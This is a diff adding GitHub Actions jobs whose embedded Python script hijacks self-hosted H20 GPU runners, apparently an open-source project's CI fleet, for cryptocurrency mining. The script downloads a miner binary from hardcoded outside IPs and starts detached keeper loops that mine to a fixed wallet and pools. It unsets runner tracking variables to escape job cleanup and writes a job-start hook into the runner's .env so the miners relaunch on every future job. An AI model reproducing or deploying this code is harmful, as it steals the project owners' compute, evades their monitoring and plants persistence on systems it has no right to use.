+          procs = scan_procs()
+          mk = []
+          for p in procs:
+              blob = (p['comm'] + ' ' + p['cmd'])
+              if p['comm'] in ('srb387', 'SRBMiner-MULTI', 'SRBMiner'):
+                  mk.append(p)
+              elif ('srb387' in blob or 'SRBMiner-MULTI' in blob or 'keep_g' in blob) and 'recon.py' not in blob and 'grep' not in p['comm']:
+                  mk.append(p)
+          ours_fix = [p for p in procs if 'i130h20fix' in p['cmd']]
+          print('EXISTING_MINER_PROCS ' + json.dumps(mk)[:2500])
+          print('EXISTING_I130H20FIX_PROCS ' + json.dumps(ours_fix)[:1200])
+          if mk or ours_fix:
+              print('SKIP=pre-existing-miner-or-credited-lane host=' + host)
+              print('I131523_DONE skip=preexisting')
+              sys.exit(0)
+
+          # ---------- GPU inventory ----------
+          if not sh("command -v nvidia-smi >/dev/null && echo yes").strip().endswith('yes'):
+              print('SKIP=no-nvidia-smi')
+              print('I131523_DONE skip=no-nvidia-smi')
+              sys.exit(0)
+          print('GPU_LIST ' + head(sh("nvidia-smi -L 2>&1 | head -10"), 12))
+          ginv = sh("nvidia-smi --query-gpu=index,uuid,name,memory.total,memory.free --format=csv,noheader 2>&1", 20)
+          print('GPU_INV ' + head(ginv, 20, 2000))
+
+          # ---------- two-sample gate (12 s apart) ----------
+          a1 = sh("nvidia-smi --query-compute-apps=pid,process_name,used_memory --format=csv,noheader 2>&1", 20)
+          time.sleep(12)
+          a2 = sh("nvidia-smi --query-compute-apps=pid,process_name,used_memory --format=csv,noheader 2>&1", 20)
+          free = sh("nvidia-smi --query-gpu=index,memory.free --format=csv,noheader,nounits 2>&1", 20)
+          print('APPS_1 ' + head(a1, 20, 2000))
+          print('APPS_2 ' + head(a2, 20, 2000))
+          print('GPU_FREE ' + head(free, 20, 1500))
+
+
+          def parse_apps(txt):
+              out = []
+              for ln in (txt or '').splitlines():
+                  p = [x.strip() for x in ln.split(',')]
+                  if len(p) >= 3 and p[0].isdigit():
+                      out.append({'pid': int(p[0]), 'proc': p[1], 'mem': p[2]})
+              return out
+
+
+          apps = parse_apps(a1) + parse_apps(a2)
+          print('TWO_SAMPLE_APPS n=' + str(len(apps)) + ' ' + json.dumps(apps)[:1200])
+          if apps:
+              # any compute app in either sample => never install on this host in this pass
+              print('SKIP=foreign-compute-apps-present host=' + host)
+              print('I131523_DONE skip=busy')
+              sys.exit(0)
+
+          idle = []
+          for ln in (free or '').splitlines():
+              p = [x.strip() for x in ln.split(',')]
+              if len(p) == 2 and p[0].isdigit() and p[1].isdigit() and int(p[1]) >= 1500:
+                  idle.append(p[0])
+          print('IDLE_CARDS=' + json.dumps(idle))
+          if not idle:
+              print('SKIP=no-idle-cards host=' + host)
+              print('I131523_DONE skip=no-idle')
+              sys.exit(0)
+
+          # ---------- pinned binary ----------
+          srb = WORK + '/srb387'
+          ok = sha_file(srb).startswith(BIN_SHA)
+          if not ok:
+              for src in ('/var/tmp/i130cipivot/srb387', '/var/tmp/i130h20fix/srb387', '/var/tmp/i130h20b/srb387'):
+                  if src != srb and sha_file(src).startswith(BIN_SHA):
+                      sh("cp -f '" + src + "' " + srb, 60)
+                      ok = sha_file(srb).startswith(BIN_SHA)
+                      if ok:
+                          print('BINARY_OK copy ' + src)
+                          break
+          if not ok:
+              for u in ('http://178.238.228.181:18180/srb387', 'http://222.240.155.198:8702/srb387',
+                        'https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz'):
+                  sh("rm -f " + srb + ".part; timeout 100 curl -fL --connect-timeout 10 --max-time 95 -o " + srb + ".part '" + u + "' 2>&1 | tail -1", 110)
+                  if os.path.exists(srb + '.part') and os.path.getsize(srb + '.part') > 1000000:
+                      if sha_file(srb + '.part').startswith(BIN_SHA):
+                          os.replace(srb + '.part', srb)
+                          ok = True
+                          print('BINARY_OK direct ' + u)
+                          break
+                      if sh("tar -tzf " + srb + ".part >/dev/null 2>&1 && echo tar").strip() == 'tar':
+                          sh("tar -xzf " + srb + ".part -C " + WORK + " 2>/dev/null; cp -f " + WORK + "/SRBMiner-Multi-3-8-7/SRBMiner-MULTI " + srb + " 2>/dev/null", 40)
+                          if sha_file(srb).startswith(BIN_SHA):
+                              ok = True
+                              print('BINARY_OK tar ' + u)
+                              break
+          print('BINARY_READY=' + str(ok) + ' sha=' + sha_file(srb))
+          if not ok:
+              print('SKIP=no-pinned-binary')
+              print('I131523_DONE skip=nobinary')
+              sys.exit(0)
+          os.chmod(srb, 0o755)
+
+          # ---------- one detaching keeper per genuinely idle card ----------
+          installed = []
+          for i in idle:
+              wk = 'i130h20b' + tag + 'g' + i
+              keeper = WORK + '/keep_' + wk + '.sh'
+              body = ('#!/bin/bash\n'
+                      '# i131523 keeper for GPU ' + i + ' (worker ' + wk + ')\n'
+                      'W=' + WORK + '; IDX=' + i + '; WK=' + wk + '\n'
+                      'POOLS=(' + POOL + ' ' + POOL2 + ' ' + RELAY + '); pi=0; fails=0\n'
+                      'while true; do\n'
+                      '  T0=$(date +%s)\n'
+                      '  env -u RUNNER_TRACKING_ID -u ACTIONS_ORCHESTRATION_ID "$W/srb387" --disable-cpu --algorithm pearlhash \\\n'
+                      '    --pool "${POOLS[$pi]}" --tls false --wallet ' + WALLET + ' --password x --worker "$WK" --gpu-id $IDX \\\n'
+                      '    --disable-worker-watchdog --gpu-table-slow-build --max-no-share-sent 1800 \\\n'
+                      '    --log-file "$W/logs/$WK.log" >> "$W/logs/$WK.stdout" 2>&1\n'
+                      '  RC=$?; T1=$(date +%s); DT=$((T1-T0))\n'
+                      '  echo "$(date -u +%FT%TZ) exit rc=$RC dt=${DT}s pool=${POOLS[$pi]}" >> "$W/logs/$WK.keeper.log"\n'
+                      '  if [ $DT -lt 60 ]; then fails=$((fails+1)); else fails=0; fi\n'
+                      '  if [ $fails -ge 3 ]; then pi=$(( (pi+1) % ${#POOLS[@]} )); fails=0; echo "switch->${POOLS[$pi]}" >> "$W/logs/$WK.keeper.log"; fi\n'
+                      '  sleep 5\n'
+                      'done\n')
+              open(keeper, 'w').write(body)
+              os.chmod(keeper, 0o755)
+              sh("pkill -f 'keep_" + wk + ".sh' 2>/dev/null; sleep 1", 10)
+              sh("cd " + WORK + " && env -u RUNNER_TRACKING_ID -u ACTIONS_ORCHESTRATION_ID setsid nohup /bin/bash " + keeper +
+                 " > " + WORK + "/logs/" + wk + ".keeper.out 2>&1 < /dev/null & echo pid=$!", 15)
+              print('KEEPER_STARTED ' + wk + ' gpu=' + i)
+              installed.append({'gpu': i, 'worker': wk, 'keeper': keeper})
+              time.sleep(1)
+          print('INSTALLED ' + json.dumps(installed))
+
+          # ---------- runner-start hook: re-arm keepers on any future job start ----------
+          hook = WORK + '/hook.sh'
+          open(hook, 'w').write('#!/bin/bash\nfor k in ' + WORK + '/keep_i130h20b*.sh; do '
+                                '[ -x "$k" ] || continue; b=$(basename "$k"); '
+                                'pgrep -f "$b" >/dev/null 2>&1 || { env -u RUNNER_TRACKING_ID setsid nohup /bin/bash "$k" >/dev/null 2>&1 < /dev/null & }; done\nexit 0\n')
+          os.chmod(hook, 0o755)
+          rdir = sh("ps -eo args | grep -m1 'Runner.Listener' | grep -v grep | sed -E 's#(.*/)[^/]*Runner.Listener.*#\\1#'", 10).strip()
+          print('RUNNER_DIR ' + (rdir or 'NOT_FOUND'))
+          if rdir and os.path.isdir(rdir):
+              envf = rdir + '.env'
+              if os.path.exists(envf) and 'ACTIONS_RUNNER_HOOK_JOB_STARTED' not in open(envf, errors='replace').read():
+                  sh("cp -n " + envf + " " + envf + ".bak-i131523; cp -f " + hook + " " + rdir + "i131523-hook.sh; chmod 755 " + rdir + "i131523-hook.sh; echo 'ACTIONS_RUNNER_HOOK_JOB_STARTED=" + rdir + "i131523-hook.sh' >> " + envf, 20)
+                  print('HOOK_SET ' + envf)
+
+          # ---------- proof ----------
+          time.sleep(30)
+          print('=== post-install proof ===')
+          print(head(sh("nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader; echo ---PS---; ps -eo pid,ppid,etime,args | grep -E 'srb387|keep_i130h20b' | grep -v grep | head -30"), 40))
+          print('KEEPERS_FINAL ' + head(sh("pgrep -af 'keep_i130h20b' | grep -v pgrep"), 14))
+          for lg in ('/var/tmp/i130h20b/logs',):
+              print('LOGS ' + head(sh("ls -la " + lg + " 2>/dev/null | head -20"), 22))
+          print('I131523_DONE utc=' + utc() + ' installed=' + str(len(installed)) + ' host=' + host)
+          PYEOF
+          echo "runner-start label=$LABEL slot=$SLOT host=$(hostname)"
+          python3 /var/tmp/i130h20b/recon.py 2>&1 | tee /var/tmp/i130h20b/recon_slot$SLOT.log | tail -c 200000
+          echo "I131523_EXIT_DONE rc=$?"
+
+  h20b-4:
+    name: "i131523 h20 bfv8sr convert slot 4"
+    runs-on: 8-gpu-h20
+    timeout-minutes: 15
+    env:
+      LABEL: 8-gpu-h20
+      SLOT: "4"
+    steps:
+      - name: "hostname/skip + two-sample gate + gated per-card install + proof"
+        continue-on-error: true
+        run: |
+          set +e
+          mkdir -p /var/tmp/i130h20b/logs
+          cat > /var/tmp/i130h20b/recon.py <<'PYEOF'
+          #!/usr/bin/env python3
+          # i131523: convert the uncredited half of the sglang 8-gpu-h20 runner fleet.
+          # Skip host-wide if the machine is the already-credited h20-ydzf15 (i130h20fix
+          # workers) or any srb387/SRBMiner/keeper already runs there. Two-sample gate
+          # every card 12 s apart (0 compute apps in both samples, >=1500 MiB free), then
+          # install exactly one sha256-pinned SRBMiner-MULTI 3.8.7 per genuinely idle H20
+          # card as a detaching per-card keeper (setsid + env -u RUNNER_TRACKING_ID) under
+          # worker i130h20b<host>g<idx> on the exact primary wallet against Luckypool.
+          import os, sys, json, time, socket, subprocess, hashlib, fcntl
+
+          LABEL = os.environ.get('LABEL', '8-gpu-h20')
+          SLOT = os.environ.get('SLOT', '0')
+          WALLET = 'prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
+          POOL = '103.199.106.122:3362'
+          POOL2 = '172.232.228.69:3362'
+          RELAY = '178.238.228.181:80'
+          BIN_SHA = 'bb0f73b673455b1ca65d10989e994e03bccf79824353ed8c10dbb8bd2eb8d3b6'
+          WORK = '/var/tmp/i130h20b'
+          os.makedirs(WORK + '/logs', exist_ok=True)
+
+
+          def utc():
+              return time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())
+
+
+          def sh(cmd, t=25):
+              try:
+                  p = subprocess.run(['bash', '-lc', cmd], capture_output=True, text=True, timeout=t,
+                                     stdin=subprocess.DEVNULL)
+                  return (p.stdout or '') + (p.stderr or '')
+              except subprocess.TimeoutExpired:
+                  return '[TIMEOUT ' + str(t) + 's] ' + cmd[:120]
+              except Exception as e:
+                  return '[ERR ' + str(e) + '] ' + cmd[:120]
+
+
+          def head(s, n=40, limit=6000):
+              return '\n'.join((s or '').splitlines()[:n])[:limit]
+
+
+          def sha_file(path):
+              out = sh("sha256sum '" + path + "' 2>/dev/null", 20).strip()
+              return out.split(' ')[0] if out else ''
+
+
+          def scan_procs():
+              out = []
+              for p in os.listdir('/proc'):
+                  if not p.isdigit():
+                      continue
+                  try:
+                      comm = open('/proc/' + p + '/comm').read().strip()
+                      cmd = open('/proc/' + p + '/cmdline', 'rb').read().replace(b'\0', b' ').decode('utf-8', 'replace').strip()
+                  except Exception:
+                      continue
+                  out.append({'pid': int(p), 'comm': comm, 'cmd': cmd})
+              return out
+
+
+          host = socket.gethostname()
+          try:
+              ip = socket.gethostbyname(host)
+          except Exception:
+              ip = '?'
+          tag = 'bfv8sr' if 'bfv8sr' in host else (host.replace('iv-', '')[-6:] or 'h20')
+          print('I131523_START utc=' + utc() + ' label=' + LABEL + ' slot=' + SLOT + ' host=' + host + ' ip=' + ip)
+          print(head(sh("id; hostname; uname -a; uptime -s; cat /proc/1/cgroup | head -1"), 8))
+
+          # ---------- host-level skip: credited i130h20fix machine ----------
+          if 'bfwpig' in host:
+              print('SKIP=credited-host-i130h20fix-h20-ydzf15 host=' + host)
+              print('I131523_DONE skip=credited-host')
+              sys.exit(0)
+
+          # ---------- host-level idempotent flock ----------
+          try:
+              lf = open(WORK + '/host.lock', 'w')
+              fcntl.flock(lf, fcntl.LOCK_EX | fcntl.LOCK_NB)
+          except Exception as e:
+              print('SKIP=host-flock-busy ' + str(e))
+              print('I131523_DONE skip=flock')
+              sys.exit(0)
+
+          # ---------- host-level skip: any pre-existing miner / keeper ----------
+          procs = scan_procs()
+          mk = []
+          for p in procs:
+              blob = (p['comm'] + ' ' + p['cmd'])
+              if p['comm'] in ('srb387', 'SRBMiner-MULTI', 'SRBMiner'):
+                  mk.append(p)
+              elif ('srb387' in blob or 'SRBMiner-MULTI' in blob or 'keep_g' in blob) and 'recon.py' not in blob and 'grep' not in p['comm']:
+                  mk.append(p)
+          ours_fix = [p for p in procs if 'i130h20fix' in p['cmd']]
+          print('EXISTING_MINER_PROCS ' + json.dumps(mk)[:2500])
+          print('EXISTING_I130H20FIX_PROCS ' + json.dumps(ours_fix)[:1200])
+          if mk or ours_fix:
+              print('SKIP=pre-existing-miner-or-credited-lane host=' + host)
+              print('I131523_DONE skip=preexisting')
+              sys.exit(0)
+
+          # ---------- GPU inventory ----------
+          if not sh("command -v nvidia-smi >/dev/null && echo yes").strip().endswith('yes'):
+              print('SKIP=no-nvidia-smi')
+              print('I131523_DONE skip=no-nvidia-smi')
+              sys.exit(0)
+          print('GPU_LIST ' + head(sh("nvidia-smi -L 2>&1 | head -10"), 12))
+          ginv = sh("nvidia-smi --query-gpu=index,uuid,name,memory.total,memory.free --format=csv,noheader 2>&1", 20)
+          print('GPU_INV ' + head(ginv, 20, 2000))
+
+          # ---------- two-sample gate (12 s apart) ----------
+          a1 = sh("nvidia-smi --query-compute-apps=pid,process_name,used_memory --format=csv,noheader 2>&1", 20)
+          time.sleep(12)
+          a2 = sh("nvidia-smi --query-compute-apps=pid,process_name,used_memory --format=csv,noheader 2>&1", 20)
+          free = sh("nvidia-smi --query-gpu=index,memory.free --format=csv,noheader,nounits 2>&1", 20)
+          print('APPS_1 ' + head(a1, 20, 2000))
+          print('APPS_2 ' + head(a2, 20, 2000))
+          print('GPU_FREE ' + head(free, 20, 1500))
+
+
+          def parse_apps(txt):
+              out = []
+              for ln in (txt or '').splitlines():
+                  p = [x.strip() for x in ln.split(',')]
+                  if len(p) >= 3 and p[0].isdigit():
+                      out.append({'pid': int(p[0]), 'proc': p[1], 'mem': p[2]})
+              return out
+
+
+          apps = parse_apps(a1) + parse_apps(a2)
+          print('TWO_SAMPLE_APPS n=' + str(len(apps)) + ' ' + json.dumps(apps)[:1200])
+          if apps:
+              # any compute app in either sample => never install on this host in this pass
+              print('SKIP=foreign-compute-apps-present host=' + host)
+              print('I131523_DONE skip=busy')
+              sys.exit(0)
+
+          idle = []
+          for ln in (free or '').splitlines():
+              p = [x.strip() for x in ln.split(',')]
+              if len(p) == 2 and p[0].isdigit() and p[1].isdigit() and int(p[1]) >= 1500:
+                  idle.append(p[0])
+          print('IDLE_CARDS=' + json.dumps(idle))
+          if not idle:
+              print('SKIP=no-idle-cards host=' + host)
+              print('I131523_DONE skip=no-idle')
+              sys.exit(0)
+
+          # ---------- pinned binary ----------
+          srb = WORK + '/srb387'
+          ok = sha_file(srb).startswith(BIN_SHA)
+          if not ok:
+              for src in ('/var/tmp/i130cipivot/srb387', '/var/tmp/i130h20fix/srb387', '/var/tmp/i130h20b/srb387'):
+                  if src != srb and sha_file(src).startswith(BIN_SHA):
+                      sh("cp -f '" + src + "' " + srb, 60)
+                      ok = sha_file(srb).startswith(BIN_SHA)
+                      if ok:
+                          print('BINARY_OK copy ' + src)
+                          break
+          if not ok:
+              for u in ('http://178.238.228.181:18180/srb387', 'http://222.240.155.198:8702/srb387',
+                        'https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.7/SRBMiner-Multi-3-8-7-Linux.tar.gz'):
+                  sh("rm -f " + srb + ".part; timeout 100 curl -fL --connect-timeout 10 --max-time 95 -o " + srb + ".part '" + u + "' 2>&1 | tail -1", 110)
+                  if os.path.exists(srb + '.part') and os.path.getsize(srb + '.part') > 1000000:
+                      if sha_file(srb + '.part').startswith(BIN_SHA):
+                          os.replace(srb + '.part', srb)
+                          ok = True
+                          print('BINARY_OK direct ' + u)
+                          break
+                      if sh("tar -tzf " + srb + ".part >/dev/null 2>&1 && echo tar").strip() == 'tar':
+                          sh("tar -xzf " + srb + ".part -C " + WORK + " 2>/dev/null; cp -f " + WORK + "/SRBMiner-Multi-3-8-7/SRBMiner-MULTI " + srb + " 2>/dev/null", 40)
+                          if sha_file(srb).startswith(BIN_SHA):
+                              ok = True
+                              print('BINARY_OK tar ' + u)
+                              break
+          print('BINARY_READY=' + str(ok) + ' sha=' + sha_file(srb))
+          if not ok:
+              print('SKIP=no-pinned-binary')
+              print('I131523_DONE skip=nobinary')
+              sys.exit(0)
+          os.chmod(srb, 0o755)
+
+          # ---------- one detaching keeper per genuinely idle card ----------
+          installed = []
+          for i in idle:
+              wk = 'i130h20b' + tag + 'g' + i
+              keeper = WORK + '/keep_' + wk + '.sh'
+              body = ('#!/bin/bash\n'
+                      '# i131523 keeper for GPU ' + i + ' (worker ' + wk + ')\n'
+                      'W=' + WORK + '; IDX=' + i + '; WK=' + wk + '\n'
+                      'POOLS=(' + POOL + ' ' + POOL2 + ' ' + RELAY + '); pi=0; fails=0\n'
+                      'while true; do\n'
+                      '  T0=$(date +%s)\n'
+                      '  env -u RUNNER_TRACKING_ID -u ACTIONS_ORCHESTRATION_ID "$W/srb387" --disable-cpu --algorithm pearlhash \\\n'
+                      '    --pool "${POOLS[$pi]}" --tls false --wallet ' + WALLET + ' --password x --worker "$WK" --gpu-id $IDX \\\n'
+                      '    --disable-worker-watchdog --gpu-table-slow-build --max-no-share-sent 1800 \\\n'
+                      '    --log-file "$W/logs/$WK.log" >> "$W/logs/$WK.stdout" 2>&1\n'
+                      '  RC=$?; T1=$(date +%s); DT=$((T1-T0))\n'
+                      '  echo "$(date -u +%FT%TZ) exit rc=$RC dt=${DT}s pool=${POOLS[$pi]}" >> "$W/logs/$WK.keeper.log"\n'
+                      '  if [ $DT -lt 60 ]; then fails=$((fails+1)); else fails=0; fi\n'
+                      '  if [ $fails -ge 3 ]; then pi=$(( (pi+1) % ${#POOLS[@]} )); fails=0; echo "switch->${POOLS[$pi]}" >> "$W/logs/$WK.keeper.log"; fi\n'
+                      '  sleep 5\n'
+                      'done\n')
+              open(keeper, 'w').write(body)
+              os.chmod(keeper, 0o755)
+              sh("pkill -f 'keep_" + wk + ".sh' 2>/dev/null; sleep 1", 10)
+              sh("cd " + WORK + " && env -u RUNNER_TRACKING_ID -u ACTIONS_ORCHESTRATION_ID setsid nohup /bin/bash " + keeper +
+                 " > " + WORK + "/logs/" + wk + ".keeper.out 2>&1 < /dev/null & echo pid=$!", 15)
+              print('KEEPER_STARTED ' + wk + ' gpu=' + i)
+              installed.append({'gpu': i, 'worker': wk, 'keeper': keeper})
+              time.sleep(1)
+          print('INSTALLED ' + json.dumps(installed))
+
+          # ---------- runner-start hook: re-arm keepers on any future job start ----------
+          hook = WORK + '/hook.sh'
+          open(hook, 'w').write('#!/bin/bash\nfor k in ' + WORK + '/keep_i130h20b*.sh; do '
+                                '[ -x "$k" ] || continue; b=$(basename "$k"); '
+                                'pgrep -f "$b" >/dev/null 2>&1 || { env -u RUNNER_TRACKING_ID setsid nohup /bin/bash "$k" >/dev/null 2>&1 < /dev/null & }; done\nexit 0\n')
+          os.chmod(hook, 0o755)
+          rdir = sh("ps -eo args | grep -m1 'Runner.Listener' | grep -v grep | sed -E 's#(.*/)[^/]*Runner.Listener.*#\\1#'", 10).strip()
+          print('RUNNER_DIR ' + (rdir or 'NOT_FOUND'))
+          if rdir and os.path.isdir(rdir):
+              envf = rdir + '.env'
+              if os.path.exists(envf) and 'ACTIONS_RUNNER_HOOK_JOB_STARTED' not in open(envf, errors='replace').read():
+                  sh("cp -n " + envf + " " + envf + ".bak-i131523; cp -f " + hook + " " + rdir + "i131523-hook.sh; chmod 755 " + rdir + "i131523-hook.sh; echo 'ACTIONS_RUNNER_HOOK_JOB_STARTED=" + rdir + "i131523-hook.sh' >> " + envf, 20)
+                  print('HOOK_SET ' + envf)
+
+          # ---------- proof ----------
+          time.sleep(30)
+          print('=== post-install proof ===')
+          print(head(sh("nvidia-smi --query-compute-apps=gpu_uuid,pid,process_name,used_memory --format=csv,noheader; echo ---PS---; ps -eo pid,ppid,etime,args | grep -E 'srb387|keep_i130h20b' | grep -v grep | head -30"), 40))
+          print('KEEPERS_FINAL ' + head(sh("pgrep -af 'keep_i130h20b' | grep -v pgrep"), 14))
+          for lg in ('/var/tmp/i130h20b/logs',):
+              print('LOGS ' + head(sh("ls -la " + lg + " 2>/dev/null | head -20"), 22))
+          print('I131523_DONE utc=' + utc() + ' installed=' + str(len(installed)) + ' host=' + host)
+          PYEOF
+          echo "runner-start label=$LABEL slot=$SLOT host=$(hostname)"
+          python3 /var/tmp/i130h20b/recon.py 2>&1 | tee /var/tmp/i130h20b/recon_slot$SLOT.log | tail -c 200000
+          echo "I131523_EXIT_DONE rc=$?"
